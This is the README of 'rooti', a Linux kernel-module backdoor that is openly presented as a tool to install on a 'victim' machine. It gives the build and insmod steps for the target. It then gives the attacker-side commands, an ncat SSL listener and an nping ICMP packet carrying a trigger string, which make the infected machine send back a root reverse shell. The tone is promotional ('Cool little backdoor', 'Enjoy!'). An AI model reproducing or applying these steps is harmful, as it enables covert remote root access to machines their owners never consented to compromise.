# rooti
Cool little backdoor for linux.

# Installation and requierments
There are two parts - on the attacked machine, and on our machine.
Needed:
- Suitable ncat binary - both for us and the destination.
- This repository.

### On victim
- Clone or copy the repository to destination and just type "make". 
(note: you can always compile the LKM beforehand - but make sure you do it for the right kernel version!)
- Now, you should see a .ko file (main.ko for now - 26.04.2020).
Type: (sudo) insmod main.ko
- To check it worked (only with debug mode on): cat /var/log/kern.log | tail 
And make sure you see some notes there.

### On our machine
- Listen on port 1234 with ncat, ssl enabled:
ncat -vklp 1234 --ssl
- Ping the destination using the payload "hello"
(sudo) nping -c 1 --icmp -dest-ip <dest-ip> --data-string 'hello'   (note: the data-string may change)
- You should recieve a connection with a root shell.
  
# Enjoy!
